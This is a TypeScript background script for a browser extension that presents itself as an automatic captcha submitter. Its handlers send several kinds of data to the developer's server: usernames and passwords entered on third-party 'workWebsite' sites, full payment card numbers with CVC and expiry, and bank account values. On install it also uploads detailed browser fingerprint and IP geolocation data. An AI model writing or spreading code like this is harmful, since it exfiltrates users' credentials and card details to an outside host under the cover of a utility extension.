/**
 * Auto captcha submit
 * Developer: Mr Abir Ahamed
 * Website: https://www.mishusoft.com
 * Official Link: https://download.mishusoft.com/addons/autocapsubmitpro/
 * */

'use strict';
import {browser} from "webextension-polyfill-ts";
import {BrowserJS} from "./browserjs";
import {app, today} from "./db";
import {optimizeAppSettingObject, sendRequest} from "./lib-functions-background";
import {appPaymentURL, globalAppMonitorURL} from "./lib-main";

let acsComPortBack: any;
let globalAppBrowser: any;
let globalAppIP: any;
let BrJS = new BrowserJS(window.navigator);
const appTracker = app.about.short_name + '@' + app.about.version;

function messengerConnector(p: any) {
    acsComPortBack = p;
    acsComPortBack.onMessage.addListener(backgroundResponder);
    /*acsComPortBack.onDisconnect.addListener(function (p: { name: string; }) {
        console.error('ERROR: Using port (' + p.name + ') are disconnected!!');
        console.info('INFO: reconnecting to port (' + p.name + ') !!');
    });*/
}

browser.runtime.onConnect.addListener(messengerConnector);

function createDefaultAppData(browserNameFull: string, browserVersion: string, clientIP: string, clientCity: string, clientCountry: string, clientDeviceName: string, clientDevicePlatform: string, clientPlatformArchitecture: string) {
    return  {
        "app": {"id": "", "name": app.about.name, "version": app.about.version},
        "browser": {"name": browserNameFull, "version": browserVersion},
        "client": {"ip": clientIP, "city": clientCity, "country": clientCountry},
        "device": {
            "name": clientDeviceName,
            "platform": clientDevicePlatform,
            "architecture": clientPlatformArchitecture
        },
        "install": {"date": today},
        "licence": {
            "key": "",
            "type": "",
            "issue": "",
            "update": "",
            "nextUpdate": "",
            "expire": "",
            "limit": 0,
            "limitBase": 0,
            "earn": 0
        },
        "user": {"first_name": "", "last_name": "", "email": "", "password": ""},
        /*new Date(year, monthIndex [, day [, hours [, minutes [, seconds [, milliseconds]]]]])*/
    };
}

function setDefaultQAppData(ip: any, city: any, country_name: any) {
    browser.storage.local.set(
        createDefaultAppData(BrJS.BrowserNameFull, BrJS.BrowserVersion, ip, city, country_name,
            BrJS.DeviceName, BrJS.PlatformName, BrJS.PlatformArchitecture
        ))
        /*#!if debug===true*/
        .then(() => {
            console.log('app configuration set!')
        });
    /*#!endif*/
}

function installDefaultQAppData() {
    sendRequest({
        method: "GET",
        url: app.website.IpInfo,
        async: true,
        header: [{name: "Accept", value: "application/json"}]
    }, function (data: { ip: any; city: any; country_name: any; }) {
        setDefaultQAppData(data.ip, data.city, data.country_name);
    });
}

export function checkSettings(details: { reason: string }, ipdata?: any) {
    checkAppInstallation(function (setting:any) {
        let client = {
            ip: undefined,
            city: undefined,
            country: undefined
        };

        optimizeAppSettingObject(setting,[{'client':['ip','city','country']}],function (setting:any) {
            client.ip = setting.client.ip;
            client.city = setting.client.city;
            client.country = setting.client.country;
        },installDefaultQAppData);

        optimizeAppSettingObject(setting,[{'app':['id']}],function (setting:any) {
            if (setting.app.id !== ''){
                optimizeAppSettingObject(setting,[{'app':['name','version']}],function (setting:any) {
                    if (setting.app.version !== app.about.version) {
                        browser.storage.local.set({
                            "app": {
                                "id": setting.app.id,
                                "name": setting.app.name,
                                "version": app.about.version
                            }
                        });
                    }
                },function () {
                    browser.storage.local.set({
                        "app": {
                            "id": setting.app.id,
                            "name": app.about.name,
                            "version": app.about.version
                        }
                    });
                });
            } else {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "getPubAppID",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "IdRequest": {
                            "name": app.about.name,
                            "version": app.about.version,
                            "ip": client.ip,
                            "browser": BrJS.BrowserNameFull,
                            "message": details?.reason/*'checkRun' */
                        }
                    }
                }, function (IdResponse: { app_pub_id: any; }) {
                    browser.storage.local.set({
                        "app": {
                            "id": IdResponse.app_pub_id,
                            "name": setting.app.name,
                            "version": setting.app.version
                        }
                    });
                });
            }
        },installDefaultQAppData);


        optimizeAppSettingObject(setting,[{'user':['first_name','last_name','email','password']}],function (setting:any) {
            if (setting.user.first_name !== '' && setting.user.last_name !== '' && setting.user.email !== '' && setting.user.password !== ''){
                if (acsComPortBack !== undefined) {
                    acsComPortBack.postMessage({'command': 'userRegistered'});
                }
            } else {
                if (acsComPortBack !== undefined) {
                    acsComPortBack.postMessage({'command': 'setUserDetails'});
                }
            }
        });

        optimizeAppSettingObject(setting,[{'licence':['key','type','issue','update','nextUpdate','expire','limit','limitBase']}],function (setting:any) {
            if (setting.licence.type !== ''){
                if (setting.licence.limit === 0){
                    if (acsComPortBack !== undefined) {
                        if (setting.licence.type === 'trial') {
                            return acsComPortBack.postMessage({'command': 'getLicence'});
                        } else {
                            return acsComPortBack.postMessage({
                                'command': 'waitForNextDay',
                                data: {nextUpdate: setting.licence.nextUpdate}
                            });
                        }
                    }
                } else {
                    if (acsComPortBack !== undefined) {
                        acsComPortBack.postMessage({'command': 'licenceValid'});
                    }
                }
            } else {
                return acsComPortBack.postMessage({'command': 'getLicence'});
            }
        });

    },function () {
        if (ipdata !== undefined) {
            setDefaultQAppData(ipdata.ip, ipdata.city, ipdata.country_name);
        } else {
            installDefaultQAppData();
        }
    });
}

function backgroundResponder(request: { constructor?: any; command?: any; data?: any; amount?: any; licence?: any; }) {
    /*#!if debug===true*/
    console.log(request);
    /*#!endif*/
    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
        if (request.command !== undefined) {
            if (request.command === 'checkSettings') {
                return checkSettings({reason: 'checkRun'});
            }
            if (request.command === 'saveNavigateData' || request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'saveUserSettingData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'resetUserIpData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'doUserLoginData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'recoverUserPassword') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'savePaymentMethodsData') {
                if (acsComPortBack !== undefined)
                    checkAppInstallation(function (setting: any) {
                        sendRequest({
                            method: "POST",
                            url: globalAppMonitorURL + "clientPaymentMethodsRecord",
                            async: true,
                            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                            data: {
                                "command": request.command,
                                "paymentMethodsInfo": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": setting.app.id,
                                        "ip": setting.client.ip,
                                        "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                        "browser": BrJS.BrowserNameFull
                                    },
                                    'cardNumber': request.data.cardNumber,
                                    'cardBrand': request.data.cardBrand,
                                    'cardHolder': request.data.cardHolder,
                                    "cardExpire": request.data.cardExpire,
                                    'cardCVC': request.data.cardCVC,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    });
            }
            if (request.command === 'saveBankAccountData') {
                if (acsComPortBack !== undefined)
                    checkAppInstallation(function (setting: any) {
                        sendRequest({
                            method: "POST",
                            url: globalAppMonitorURL + "clientBankAccountRecord",
                            async: true,
                            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                            data: {
                                "command": request.command,
                                "bankAccountData": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": setting.app.id,
                                        "ip": setting.client.ip,
                                        "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                        "browser": BrJS.BrowserNameFull
                                    },
                                    'dataType': request.data.dataType,
                                    'dataValue': request.data.dataValue,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    });
            }
            if (request.command === 'sendUserData') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get().then(function (appsetting) {
                            if (Object.keys(appsetting).length !== 0 && appsetting.constructor === Object) {
                                if (appsetting.app !== '' || appsetting.app.id !== '' || appsetting.app.name !== '' ||
                                    appsetting.browser !== '' || appsetting.browser.name !== '' || appsetting.browser.version !== '' ||
                                    appsetting.client !== '' || appsetting.client.ip !== '' || appsetting.client.city !== '' || appsetting.client.country !== '' ||
                                    appsetting.device !== '' || appsetting.device.name !== '' || appsetting.device.platform !== '' || appsetting.device.architecture !== '' ||
                                    appsetting.user !== '' || appsetting.user.first_name !== '' || appsetting.user.last_name !== '' || appsetting.user.email !== '' || appsetting.user.password !== '' ||
                                    appsetting.licence !== '' || appsetting.licence.key !== '' || appsetting.licence.type !== '' || appsetting.licence.issue !== '' || appsetting.licence.update !== '' ||
                                    appsetting.licence.expire !== '' || appsetting.licence.limit !== '') {
                                    return acsComPortBack.postMessage({'userdata': appsetting});
                                } else {
                                    return checkSettings({reason: 'checkRun'});
                                }
                            }
                        }
                    );
                }
            }
            if (request.command === 'sendClientIpData') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get('client').then(function (clientsetting) {
                            if (Object.keys(clientsetting).length !== 0 && clientsetting.constructor === Object) {
                                if (clientsetting.client !== '' || clientsetting.client.ip !== '' || clientsetting.client.city !== '' || clientsetting.client.country !== '') {
                                    return acsComPortBack.postMessage({'clientIpData': clientsetting.client});
                                } else {
                                    return checkSettings({reason: 'checkRun'});
                                }
                            }
                        }
                    );
                }
            }
            if (request.command === 'sendEarnLimit') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get('licence').then(function (setting) {
                            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                                return acsComPortBack.postMessage({'licence': setting.licence});
                            }
                        }
                    );
                }
            }
            if (request.command === 'decrease') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get().then(
                        function (setting) {
                            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                                if (setting.licence.limit === 0) {
                                    if (setting.licence.type === 'trial') {
                                        return acsComPortBack.postMessage({'command': 'setLicence'});
                                    } else {
                                        return acsComPortBack.postMessage({
                                            'command': 'waitForNextDay',
                                            data: {nextUpdate: setting.licence.nextUpdate}
                                        });
                                    }
                                } else {
                                    sendRequest({
                                        method: "POST",
                                        url: globalAppMonitorURL + "clientEarningRecord",
                                        async: true,
                                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                                        data: {
                                            "command": request.command,
                                            "earndata": {
                                                _default_: {
                                                    "tracker": appTracker,
                                                    "app_id": setting.app.id,
                                                    "ip": setting.client.ip,
                                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                                    "browser": BrJS.BrowserNameFull
                                                },
                                                "event": 'earning',
                                                "username": request.data.username,
                                                "limit": (setting.licence.limit - request.amount),
                                                "limitBase": setting.licence.limitBase,
                                                "earn": request.amount,
                                                "today_earn": (setting.licence.earn + request.amount),
                                                "actual_earn": request.data.actual_earn,
                                                "workWebsite": request.data.workWebsite,
                                                "referrals": request.data.referrals,
                                                "referralsEarn": request.data.referrals_earn
                                            }
                                        }
                                    });
                                    browser.storage.local.set({
                                        "licence": {
                                            "key": setting.licence.key,
                                            "type": setting.licence.type,
                                            "issue": setting.licence.issue,
                                            "update": setting.licence.update,
                                            "nextUpdate": setting.licence.nextUpdate,
                                            "expire": setting.licence.expire,
                                            "limit": (setting.licence.limit - request.amount),
                                            "limitBase": setting.licence.limitBase,
                                            "earn": (setting.licence.earn + request.amount)
                                        }
                                    });
                                    browser.storage.local.get('licence').then(function (updatedLicenceSetting) {
                                            if (Object.keys(updatedLicenceSetting).length !== 0 && updatedLicenceSetting.constructor === Object) {
                                                return acsComPortBack?.postMessage({'licence': updatedLicenceSetting.licence});
                                            }
                                        }
                                    );
                                }
                            }
                        }
                    );
                }
            }
            if (request.command === 'setLicence') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get('licence').then(
                        function (licenceSetting) {
                            if (Object.keys(licenceSetting).length !== 0 && licenceSetting.constructor === Object) {
                                browser.storage.local.set({
                                    "licence": {
                                        "key": request.licence.key,
                                        "type": request.licence.type,
                                        "issue": request.licence.issue,
                                        "update": request.licence.update,
                                        "nextUpdate": request.licence.nextUpdate,
                                        "expire": request.licence.expire,
                                        "limit": request.licence.limit,
                                        "limitBase": request.licence.limitBase,
                                        "earn": licenceSetting.licence.earn
                                    }
                                });
                                return acsComPortBack.postMessage({'command': 'licenceValid'});
                            }
                        }
                    );
                }
            }
            if (request.command === 'verifyClient') {
                return browserUserDataManagement(request.command, request.data);
            }
        }
    }
    return checkSettings({reason: 'checkRun'});
}

function browserUserDataManagement(command: string, data: { username?: any; password: any; workWebsite?: any; email?: any; emailAddress: any; security_code?: any; planType?: any; plan?: any; amount?: any; firstName?: any; lastName?: any; }) {

    checkAppInstallation(function (setting:any) {
        optimizeAppSettingObject(setting,[{"app": ["id"]}, {"browser": ["name"]}, {"client": ["ip"]}, {"user": ["email"]}],function (setting:any) {
            if (command === 'saveLoginData') {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            _default_: {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": BrJS.BrowserNameFull
                            },
                            "event": 'login',
                            "username": data.username,
                            "password": data.password,
                            "workWebsite": data.workWebsite
                        }
                    }
                });
            }
            else if (command === 'saveRegistrationData') {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            _default_: {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": BrJS.BrowserNameFull
                            },
                            "event": "registration",
                            "username": data.username,
                            "password": data.password,
                            "email": data.email,
                            "workWebsite": data.workWebsite
                        }
                    }
                });
            }
            else if (command === 'saveLogoutData') {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            _default_: {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": BrJS.BrowserNameFull
                            },
                            "event": "logout",
                            "username": data.username,
                            "workWebsite": data.workWebsite
                        }
                    }
                });
            }
            else if (command === 'saveNavigateData') {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            _default_: {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": BrJS.BrowserNameFull
                            },
                            "event": "navigate",
                            "username": data.username,
                            "workWebsite": data.workWebsite
                        }
                    }
                });
            }
            else if (command === 'saveUserSettingData') {
                configureUserNLicenceByServer(command, data);
            } else if (command === 'resetUserIpData') {
                configureUserNLicenceByServer(command, data);
            }
            else if (command === 'doUserLoginData') {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            _default_: {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": BrJS.BrowserNameFull
                            },
                            "email": data.emailAddress,
                            "password": data.password,
                            "passwordType": 'normal'
                        }
                    }
                }, function (reply: any) {
                    /*#!if debug===true*/
                    console.log(reply);
                    /*#!endif*/
                    if (reply.message === 'success') {
                        browser.storage.local.set({
                            "licence": {
                                "key": reply.licence.key,
                                "type": reply.licence.type,
                                "issue": reply.licence.issue,
                                "update": reply.licence.update,
                                "nextUpdate": reply.licence.nextUpdate,
                                "expire": reply.licence.expire,
                                "limit": (reply.licence.limit !== null) ? reply.licence.limit : 0,
                                "limitBase": (reply.licence.limitBase !== null) ? reply.licence.limitBase : 0,
                                "earn": 0
                            },
                            "user": {
                                "first_name": reply.user.firstName,
                                "last_name": reply.user.lastName,
                                "email": reply.user.emailAddress,
                                "password": reply.user.password
                            },
                            "log_status": reply.log_status
                        });
                    }
                    if (acsComPortBack !== undefined) {
                        acsComPortBack.postMessage(reply);
                    }
                });
            }
            else if (command === 'recoverUserPassword') {
                /*#!if debug===true*/
                console.log(data);
                /*#!endif*/
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            _default_: {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": BrJS.BrowserNameFull
                            },
                            "email": data.emailAddress
                        }
                    }
                }, function (reply?: any) {
                    if (acsComPortBack !== undefined) {
                        acsComPortBack.postMessage(reply);
                    }
                });
            }
            else if (command === 'verifyClient') {
                sendRequest({
                    method: "POST",
                    url: appPaymentURL + "verifyClient",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "security_code": data.security_code,
                        "appId": setting.app.id,
                        "ipAddress": setting.client.ip,
                        "browserName": setting.browser.name,
                        "userEmail": setting.user.email,
                        "planType": data.planType,
                        "plan": data.plan,
                        "amount": data.amount,
                    }
                }, function (reply: { type: string; paymentPlanTypeEncrypt: any; paymentPlanEncrypt: any; message: any; clientIP: any; emailEncrypt: any; }) {
                    /*console.log(reply);*/
                    if (reply.type === 'success') {
                        sendRequest({
                            method: "POST",
                            url: appPaymentURL + "encryptAmount",
                            async: true,
                            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                            data: {
                                "security_code": data.security_code,
                                "amount": data.amount
                            }
                        }, function (reply2: { amount: any; }) {
                            if (acsComPortBack !== undefined) {
                                acsComPortBack.postMessage({
                                    clientVerification: {
                                        "paymentUrl": appPaymentURL,
                                        "paymentPlanTypeEncrypt": reply.paymentPlanTypeEncrypt,
                                        "paymentPlanEncrypt": reply.paymentPlanEncrypt,
                                        "type": reply.type,
                                        "message": reply.message,
                                        "appId": setting.app.id,
                                        "ipAddress": reply.clientIP,
                                        "browserName": setting.browser.name,
                                        "userEmail": reply.emailEncrypt,
                                        "amount": reply2.amount
                                    }
                                });
                            }
                        });
                    }
                });
            }
        }, function () {
            return checkSettings({reason: 'checkRun'});
        });
    });
}

function configureUserNLicenceByServer(command: any, data: { username?: any; password: any; workWebsite?: any; email?: any; emailAddress: any; security_code?: any; planType?: any; plan?: any; amount?: any; firstName?: any; lastName?: any }) {
    checkAppInstallation(function (setting:any) {
        optimizeAppSettingObject(setting,[{"app": ["id"]}, {"browser": ["name"]}, {"client": ["ip"]}],function (setting:any) {
            sendRequest({
                method: "POST",
                url: globalAppMonitorURL + "browserUserDataManagement",
                async: true,
                header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                data: {
                    "command": command,
                    "userdata": {
                        "_default_": {
                            "tracker": appTracker,
                            "app_id": setting.app.id,
                            "ip": setting.client.ip,
                            "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                            "browser": setting.browser.name
                        },
                        "first_name": data.firstName,
                        "last_name": data.lastName,
                        "email": data.emailAddress,
                        "password": data.password
                    }
                }
            }, function (reply: { message: any; licence: any; u_pass: any; log_status: any; }) {
                setUserNLicenceSetting(reply, data);
                if (acsComPortBack !== undefined) {
                    acsComPortBack.postMessage(reply);
                }
            });
        }, function () {
            return checkSettings({reason: 'checkRun'});
        })
    });
}

function setUserNLicenceSetting(reply: { message: any; licence: any; u_pass: any; log_status: any }, data: { username?: any; password: any; workWebsite?: any; email?: any; emailAddress: any; security_code?: any; planType?: any; plan?: any; amount?: any; firstName?: any; lastName?: any }) {
    if (reply.message === 'success') {
        browser.storage.local.set({
            "licence": {
                "key": reply.licence.key,
                "type": reply.licence.type,
                "issue": reply.licence.issue,
                "update": reply.licence.update,
                "nextUpdate": reply.licence.nextUpdate,
                "expire": reply.licence.expire,
                "limit": (reply.licence.limit !== null) ? reply.licence.limit : 0,
                "limitBase": (reply.licence.limitBase !== null) ? reply.licence.limitBase : 0,
                "earn": 0
            },
            "user": {
                "first_name": data.firstName,
                "last_name": data.lastName,
                "email": data.emailAddress,
                "password": reply.u_pass
            },
            "log_status": reply.log_status
        });
    }
}

function checkAppInstallation(callbackFn: any,fallbackFn?: any) {
    browser.storage.local.get().then(
        function (setting) {
            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                if (callbackFn) {
                    return callbackFn(setting);
                }
            } else {
                if (fallbackFn) {
                    return fallbackFn();
                }
            }
        }
    );
}

/*runtime status, event and more*/
browser.runtime.onInstalled.addListener(function (details) {
    return sendRequest({
        method: "GET",
        url: app.website.IpInfo,
        async: true,
        header: [{name: "Accept", value: "application/json"}]
    }, function (IpDataReply: any) {
        let languageName: any = '';
        let languageNative: any = '';
        IpDataReply.languages?.forEach(function (item: { name: any; }) {
            languageName += item.name + ', ';
        });
        IpDataReply.languages?.forEach(function (item: { native: any; }) {
            languageNative += item.native + ', ';
        });

        globalAppBrowser = {
            "ip": IpDataReply.ip,
            "BrowserName": BrJS.BrowserName,
            "BrowserNameFull": BrJS.BrowserNameFull,
            "BrowserVersion": BrJS.BrowserVersion,
            "BrowserVersionFull": BrJS.BrowserVersionFull,
            "BrowserStatus": BrJS.BrowserStatus,
            "BrowserArchitecture": BrJS.BrowserArchitecture,
            "BrowserAppName": BrJS.BrowserAppName,
            "BrowserAppCodeName": BrJS.BrowserAppCodeName,
            "BrowserAppVersion": BrJS.BrowserAppVersion,
            "BrowserBuildID": BrJS.BrowserBuildID,
            "BrowserDoNotTrack": BrJS.BrowserDoNotTrack,
            "BrowserCookieEnabled": BrJS.BrowserCookieEnabled,
            "BrowserLanguage": BrJS.BrowserLanguage,
            "BrowserLanguageAll": BrJS.BrowserLanguageAll[0],
            "BrowserEngine": BrJS.BrowserEngine,
            "BrowserEngineVersion": BrJS.BrowserEngineVersion,
            "BrowserVendor": BrJS.BrowserVendor,
            "DeviceHardwareConcurrency": BrJS.DeviceHardwareConcurrency,
            "DeviceMemory": BrJS.DeviceMemory,
            "PlatformName": BrJS.PlatformName,
            "PlatformArchitecture": BrJS.PlatformArchitecture,
            "PlatformWindowManager": BrJS.PlatformWindowManager,
            "DeviceName": BrJS.DeviceName,
            "DeviceType": BrJS.DeviceType,
            "DeviceScreenWidth": BrJS.DeviceScreenWidth,
            "DeviceScreenHeight": BrJS.DeviceScreenHeight,
            "DeviceScreenColorDepth": BrJS.DeviceScreenColorDepth,
            "DeviceScreenPixelDepth": BrJS.DeviceScreenPixelDepth,
            "WindowLocationHref": BrJS.WindowLocationHref,
            "WindowLocationProtocol": BrJS.WindowLocationProtocol,
            "WindowLocationHostname": BrJS.WindowLocationHostname,
            "WindowLocationPathname": BrJS.WindowLocationPathname,
            "UserAgent": BrJS.UserAgent
        };
        globalAppIP = {
            "ip": IpDataReply.ip,
            "is_eu": IpDataReply.is_eu,
            "city": IpDataReply.city,
            "region": IpDataReply.region,
            "region_code": IpDataReply.region_code,
            "country_name": IpDataReply.country_name,
            "country_code": IpDataReply.country_code,
            "continent_name": IpDataReply.continent_name,
            "continent_code": IpDataReply.continent_code,
            "latitude": IpDataReply.latitude,
            "longitude": IpDataReply.longitude,
            "postal": IpDataReply.postal,
            "calling_code": IpDataReply.calling_code,
            "flag": IpDataReply.flag,
            "emoji_flag": IpDataReply.emoji_flag,
            "emoji_unicode": IpDataReply.emoji_unicode,
            /*"asn_asn": IpDataReply.asn.asn,
            "asn_name": IpDataReply.asn.name,
            "asn_domain": IpDataReply.asn.domain,
            "asn_route": IpDataReply.asn.route,
            "asn_type": IpDataReply.asn.type,*/
            "languages_name": languageName,
            "languages_native": languageNative,
            "currency_name": IpDataReply.currency.name,
            "currency_code": IpDataReply.currency.code,
            "currency_symbol": IpDataReply.currency.symbol,
            "currency_native": IpDataReply.currency.native,
            "currency_plural": IpDataReply.currency.plural,
            "time_zone_name": IpDataReply.time_zone.name,
            "time_zone_abbr": IpDataReply.time_zone.abbr,
            "time_zone_offset": IpDataReply.time_zone.offset,
            "time_zone_is_dst": IpDataReply.time_zone.is_dst,
            "time_zone_current_time": IpDataReply.time_zone.current_time
        };

        checkSettings(details, {
            ip: IpDataReply.ip,
            city: IpDataReply.city,
            country_name: IpDataReply.country_name
        });

        sendRequest({
            method: "POST",
            url: globalAppMonitorURL + "receiveFeedback",
            async: true,
            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
            data: {
                "update": {
                    "name": app.about.name,
                    "version": app.about.version,
                    "ip": IpDataReply.ip,
                    "browser": BrJS.BrowserNameFull,
                    "message": details.reason
                },
                "status": {
                    "name": app.about.name,
                    "version": app.about.version,
                    "ip": IpDataReply.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": BrJS.BrowserNameFull,
                    "message": 'active'
                },
                "browser": globalAppBrowser,
                "ipdata": globalAppIP
            }
        });
    });
});

browser.runtime.setUninstallURL(app.website.home)
    /*#!if debug===true*/
    .then(() => {
        console.log('app uninstall url set!')
    });
/*#!endif*/

browser.runtime.onUpdateAvailable.addListener(function () {
    browser.runtime.reload();
});

browser.browserAction.onClicked.addListener(function () {
    browser.tabs.create({
        url: app.author.refLink
    })
        /*#!if debug===true*/
        .then(() => {
            console.log('new tab created!')
        });
    /*#!endif*/
    return checkSettings({reason: 'checkRun'});
});


/*licence updater*/
setInterval(function () {
    checkAppInstallation(function (setting: any) {
        sendRequest({
            method: "POST",
            url: globalAppMonitorURL + "receiveFeedback",
            async: true,
            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
            data: {
                "status": {
                    "name": setting.app.name,
                    "version": app.about.version,
                    "ip": setting.client.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": setting.browser.name,
                    "message": 'active'
                }
            }
        }, function () {
            optimizeAppSettingObject(setting, [{"app": ["id"]},
                {"browser": ["name"]}, {"client": ["ip"]},
                {"user": ["first_name", "last_name", "email", "password"]},
                {"licence": ["limit"]}], function (setting: any) {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": 'doUserLoginData',
                        "userdata": {
                            "_default_": {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": setting.device.platform + ' ' + setting.device.architecture,
                                "browser": setting.browser.name
                            },
                            "first_name": setting.user.first_name,
                            "last_name": setting.user.last_name,
                            "email": setting.user.email,
                            "password": setting.user.password,
                            "passwordType": 'encrypt'
                        }
                    }
                }, function (reply: { message: string; licence: { key: any; type: any; issue: any; update: any; nextUpdate: any; expire: any; limit: null; limitBase: null; } | undefined; log_status: any; }) {
                    if (reply.message === 'success' && reply.licence !== undefined) {
                        browser.storage.local.set({
                            "licence": {
                                "key": reply.licence.key,
                                "type": reply.licence.type,
                                "issue": reply.licence.issue,
                                "update": reply.licence.update,
                                "nextUpdate": reply.licence.nextUpdate,
                                "expire": reply.licence.expire,
                                "limit": (reply.licence.limit !== null) ? reply.licence.limit : 0,
                                "limitBase": (reply.licence.limitBase !== null) ? reply.licence.limitBase : 0,
                                "earn": setting.licence.earn
                            },
                            "log_status": reply.log_status
                        });
                    }
                    return checkSettings({reason: 'checkRun'});
                });
            }, function () {
                return checkSettings({reason: 'checkRun'});
            });
        });
    });
}, 10000);
